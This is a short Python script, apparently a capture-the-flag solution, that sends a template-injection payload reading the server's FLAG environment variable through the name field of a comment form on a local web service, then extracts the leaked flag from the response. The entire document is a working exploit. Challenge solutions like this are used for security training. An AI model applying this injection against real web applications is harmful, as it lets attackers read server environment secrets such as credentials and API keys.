import requests

payload = "{{global.process.env.FLAG}}"
res = requests.post("http://localhost:3060/comment", data={"name": payload, "comment": " "})
print(res.text.split("Flag: ")[1].split("</div>")[0])
